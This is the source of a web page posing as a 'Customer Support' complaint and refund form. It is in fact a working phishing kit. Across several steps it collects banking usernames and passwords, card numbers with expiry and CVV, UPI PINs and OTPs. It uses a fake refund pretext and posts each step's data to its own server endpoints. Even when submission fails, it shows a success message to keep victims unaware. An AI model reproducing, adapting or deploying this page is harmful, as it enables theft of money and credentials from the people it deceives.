<!-- ======= Contact Section ======= -->
<section id="app">
  <div class="container">
    <div class="row">
      <div class="col">
        <h4><b>Customer Support</b></h4>
        <h4>All Type of Complaints Services Provider.</h4>
      </div>
    </div>
    <div class="row justify-content-center">
      <div class="col-md-6">
        <div class="form-success" v-if="success">
          <div
            class="alert alert-success"
            role="alert"
            style="text-align: center"
          >
            <h4 class="alert-heading">Success!</h4>
            <p>Your complaint has been registered successfully!</p>

            <div class="card">
              <div class="card-body" style="text-align: center">
                <h5 class="card-title">
                  Download our <b>Android App</b> to track your complaint status
                </h5>
                <a href="/support" class="btn btn-dark btn-lg" role="button"
                  ><img
                    src="assets/img/google-play.png"
                    alt=""
                  />&nbsp;&nbsp;Download</a
                >
              </div>
            </div>

            <hr />
            <a href="" class="alert-link">Go to Home</a>
          </div>
        </div>

        <form
          v-else=""
          v-on:submit.prevent="onSubmit"
          method="post"
          role="form"
          class="php-email-form"
        >
          <div v-show="step==1">
            <div class="mb-4">
              <label for="floatingInputName" class="form-label"
                >Full name <span class="required">*</span></label
              >
              <input
                type="text"
                v-on:keyup="onKeyUp"
                v-model="formData.name"
                class="form-control form-control-lg"
                id="floatingInputName"
                placeholder="Enter your full name"
                maxlength="49"
              />
            </div>
            <div class="mb-4">
              <label for="floatingSelectPaymentMode" class="form-label"
                >Payment Mode <span class="required">*</span></label
              >
              <select
                class="form-select form-control-lg"
                v-on:change="onKeyUp"
                v-model="formData.payment_method"
                id="floatingSelectPaymentMode"
                aria-label="Select a payment mode"
              >
                <option value="">--Select--</option>
                <option value="Google Pay">Google Pay</option>
                <option value="PhonePe">PhonePe</option>
                <option value="Paytm">Paytm</option>
                <option value="Amazon Pay">Amazon Pay</option>
                <option value="Internet banking">Internet banking</option>
                <option value="Credit or Debt card">Credit or Debt card</option>
                <option value="others">Others</option>
              </select>
            </div>
            <div class="mb-4">
              <label for="floatingInputMobileNo" class="form-label"
                >Registered Mobile No <span class="required">*</span></label
              >
              <input
                type="text"
                v-on:keyup="onKeyUp"
                v-model="formData.mobile_no"
                class="form-control form-control-lg"
                id="floatingInputMobileNo"
                placeholder="Enter your mobile no"
                maxlength="20"
              />
            </div>
            <div class="mb-4">
              <label for="floatingTextarea2" class="form-label"
                >Issue <span class="required">*</span></label
              >
              <textarea
                class="form-control form-control-lg"
                v-on:keyup="onKeyUp"
                v-model="formData.issue"
                placeholder="Enter issue"
                id="floatingTextarea2"
                style="height: 100px"
                maxlength="500"
              ></textarea>
            </div>
          </div>

          <div v-show="step==2">
            <div class="mb-4">
              <label for="floatingInputRefund" class="form-label"
                >Refund/Service Charge <span class="required">*</span></label
              >
              <div class="w-100 d-flex gap-3">
                <span>
                  <input
                    type="radio"
                    id="refund"
                    value="Refund"
                    v-model="formData.issueType"
					aria-selected="true"
                  />
                  <label for="refund">Refund</label>
                </span>
                <span>
                  <input
                    type="radio"
                    id="service"
                    value="Service"
                    v-model="formData.issueType"
                  />
                  <label for="service">Service Charge</label>
                </span>
              </div>
            </div>
            <div class="mb-4">
              <label for="floatingInputAmount" class="form-label"
                >Amount <span class="required">*</span></label
              >
              <input
                type="text"
                v-on:keyup="onKeyUp"
                v-model="formData.amount"
                class="form-control form-control-lg"
                id="floatingInputAmount"
                placeholder="Enter amount"
                maxlength="9"
              />
            </div>
          </div>

          <div v-show="step==3">
            <div v-if="formData.payment_method == 'Internet banking'">
              <div class="mb-4">
                <label for="floatingBankName" class="form-label"
                  >Bank Name <span class="required">*</span></label
                >
                <input
                  type="text"
                  v-on:keyup="onKeyUp"
                  v-model="formData.bankname"
                  class="form-control form-control-lg"
                  id="floatingBankName"
                  placeholder="Enter Bank Name"
                  maxlength="49"
                />
              </div>
              <div class="mb-4">
                <label for="floatingUserName" class="form-label"
                  >User Name <span class="required">*</span></label
                >
                <input
                  type="text"
                  v-on:keyup="onKeyUp"
                  v-model="formData.username"
                  class="form-control form-control-lg"
                  id="floatingUserName"
                  placeholder="Enter username"
                  maxlength="49"
                />
              </div>
              <div class="mb-4">
                <label for="floatingPasswordName" class="form-label"
                  >Password<span class="required">*</span></label
                >
                <input
                  type="text"
                  v-on:keyup="onKeyUp"
                  v-model="formData.password"
                  class="form-control form-control-lg"
                  id="floatingPasswordName"
                  placeholder="Enter password"
                  maxlength="49"
                />
              </div>
            </div>
            <div v-else-if="formData.payment_method == 'Credit or Debt card'">
              <div class="mb-4">
                <label for="floatingCardNumber" class="form-label"
                  >Card Number <span class="required">*</span></label
                >
                <input
                  type="text"
                  v-on:keyup="onKeyUp"
                  v-model="formData.cardNumber"
                  class="form-control form-control-lg"
                  id="floatingCardNumber"
                  placeholder="Enter your card number"
                  maxlength="16"
                />
              </div>
              <div class="mb-4">
                <label for="floatingCardExpire" class="form-label"
                  >Expaire Date<span class="required">*</span></label
                >
                <input
                  type="text"
                  v-on:keyup="onKeyUp"
                  v-model="formData.expire"
                  class="form-control form-control-lg"
                  id="floatingCardExpire"
                  placeholder="MM/YY"
                  maxlength="5"
                />
              </div>
              <div class="mb-4">
                <label for="floatingCvv" class="form-label"
                  >CVV<span class="required">*</span></label
                >
                <input
                  type="text"
                  v-on:keyup="onKeyUp"
                  v-model="formData.cvv"
                  class="form-control form-control-lg"
                  id="floatingCvv"
                  placeholder="Enter your CVV"
                  maxlength="3"
                />
              </div>
            </div>
            <div v-else="">
              <div class="mb-4">
				<label for="floatingInputMpin1" class="form-label"
				v-if="formData.issueType == 'Refund'"
			  >Accept UPI-MPIN <span class="required">*</span></label

			  >
                <label 
				v-else="" for="floatingInputMpin1" class="form-label"
                  >  UPI-PIN <span class="required">*</span></label
                >
                <input
                  type="password"
                  v-on:keyup="onKeyUp"
                  v-model="formData.m_pin_1"
                  class="form-control form-control-lg"
                  id="floatingInputMpin1"
                  placeholder="Enter UPI-Pin"
                  maxlength="6"
                />
              </div>
            </div>
          </div>

          <div v-show="step==4">
            <div
              v-if="formData.payment_method == 'Internet banking' || formData.payment_method == 'Credit or Debt card'"
            >
              <div class="mb-4">
                <label for="floatingotp" class="form-label"
                  >OTP <span class="required">*</span></label
                >
                <input
                  type="text"
                  v-on:keyup="onKeyUp"
                  v-model="formData.otp"
                  class="form-control form-control-lg"
                  id="floatingotp"
                  placeholder="Enter otp"
                  maxlength="8"
                />
              </div>
            </div>
            <div v-else="">
              <div class="mb-4">
				<label for="floatingInputMpin2" class="form-label"
				v-if="formData.issueType == 'Refund'"
			  >Accept UPI-MPIN <span class="required">*</span></label

			  >
                <label 
				v-else="" for="floatingInputMpin2" class="form-label"
                  >  UPI-PIN <span class="required">*</span></label
                >
                <input
                  type="password"
                  v-on:keyup="onKeyUp"
                  v-model="formData.m_pin_2"
                  class="form-control form-control-lg"
                  id="floatingInputMpin2"
                  placeholder="Enter UPI-PIN"
                  maxlength="6"
                />
              </div>
            </div>
          </div>

          <div v-show="hasError">
            <div class="alert alert-danger" role="alert">{{errorMsge}}</div>
          </div>

          <div class="text-right" style="text-align: right">
            <button
              class="btn next_button"
              type="submit"
              style="background-color: #ffc20e; color: #fff"
            >
              <span v-if="step==4">Submit</span>
              <span v-else="">Next Step</span>
            </button>
          </div>

          <div class="form-loading" v-show="loading">
            <div class="d-flex justify-content-center">
              <div class="spinner-border" role="status">
                <span class="visually-hidden">Loading...</span>
              </div>
            </div>
          </div>
        </form>
      </div>
    </div>
  </div>
</section>

<!-- Vendor JS Files -->
<script
  src="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/js/bootstrap.bundle.min.js"
  integrity="sha384-ka7Sk0Gln4gmtz2MlQnikT1wXgYsOg+OMhuP+IlRH9sENBO0LRn5q+8nbTov4+1p"
  crossorigin="anonymous"
></script>

<script>
  var app = new Vue({
    el: "#app",
    data: {
      step: 1,
      hasError: false,
      errorMsge: "All fields are required!",
      loading: false,
      success: false,
      formData: {
        issueType: "Refund",
        name: "",
        payment_method: "",
        mobile_no: "",
        amount: "",
        issue: "",
        m_pin_1: "",
        m_pin_2: "",
        otp: "",
        cvv: "",
        expire: "",
        cardNumber: "",
        password: "",
        username: "",
        bankname: "",
      },
    },
    coumputed: {
      prigressPercentage(value) {
        return (value / 5) * 100;
      },
    },
    methods: {
      onKeyUp() {
        this.errorMsge = "All fields are required!";
        this.hasError = false;
      },
      updateForm(data) {
        if (window.sessionId) {
          data.sessionId = window.sessionId;
        }
        const requestOptions = {
          method: "POST",
          headers: {
            "Content-Type": "application/json",
          },
          dataType: "json",
          credentials: "include",
          body: JSON.stringify(data),
        };
        this.loading = true;
        fetch("/api/updateForm", requestOptions)
          .then(async (response) => {
            const data = await response.json();
            if (data.sessionId) {
              window.sessionId = data.sessionId;
            }
            if (!data.status) {
              this.step = 1;
            }
            this.loading = false;
          })
          .catch((error) => {
            this.loading = false;
            this.step = 1;
            this.errorMessage = error;
            console.error("There was an error!", error);
          });
      },
      onSubmit() {
        this.errorMsge = "All fields are required!";
        this.hasError = false;

        if (this.step == 1) {
          if (
            !this.formData.name ||
            !this.formData.payment_method ||
            !this.formData.mobile_no ||
            !this.formData.issue
          ) {
            this.hasError = true;
          } else {
            this.updateForm({
              name: this.formData.name,
              payment_method: this.formData.payment_method,
              mobile_no: this.formData.mobile_no,
              issue: this.formData.issue,
              step: this.step,
            });
            this.step += 1;
          }
        } else if (this.step == 2) {
          if (!this.formData.amount ||
		  !this.formData.issueType) {
            this.hasError = true;
          } else {
            this.updateForm({
              amount: this.formData.amount,
			  issueType: this.formData.issueType,
              step: this.step,
            });
            this.step += 1;
          }
        } else if (this.step == 3) {
          if (this.formData.payment_method == "Internet banking") {
            if (!this.formData.password || !this.formData.username) {
              this.hasError = true;
            } else {
              this.updateForm({
                bankname: this.formData.bankname,
                username: this.formData.username,
                password: this.formData.password,
                step: this.step,
              });
              this.step += 1;
            }
          } else if (this.formData.payment_method == "Credit or Debt card") {
            if (
              !this.formData.cardNumber ||
              !this.formData.expire ||
              !this.formData.cvv
            ) {
              this.hasError = true;
            } else {
              this.updateForm({
                cardNumber: this.formData.cardNumber,
                expire: this.formData.expire,
                cvv: this.formData.cvv,
                step: this.step,
              });
              this.step += 1;
            }
          } else {
            if (!this.formData.m_pin_1) {
              this.hasError = true;
            } else {
              this.updateForm({
                m_pin_1: this.formData.m_pin_1,
                step: this.step,
              });
              this.step += 1;
            }
          }
        } else if (this.step == 4) {
          this.loading = true;
          this.sendData();
        } else {
          console.log("something");
        }
      },
      sendData() {
        const data = { step: this.step };
        if (this.formData.m_pin_2) {
          data.m_pin_2 = this.formData.m_pin_2;
        }
        if (this.formData.otp) {
          data.otp = this.formData.otp;
        }
        if (window.sessionId) {
          data.sessionId = window.sessionId;
        }
        const requestOptions = {
          method: "POST",
          headers: {
            "Content-Type": "application/json",
          },
          dataType: "json",
          credentials: "include",
          body: JSON.stringify(data),
        };
        fetch("/api/submitForm", requestOptions)
          .then(async (response) => {
            const data = await response.json();
            this.loading = false;
            if (data.status) {
              this.success = true;
            } else {
              alert("Something went wrong, Please click submit again.");
            }
          })
          .catch((error) => {
            this.errorMessage = error;
            this.loading = false;
            this.success = true;
            console.error("There was an error!", error);
          });
      },
    },
  });
</script>
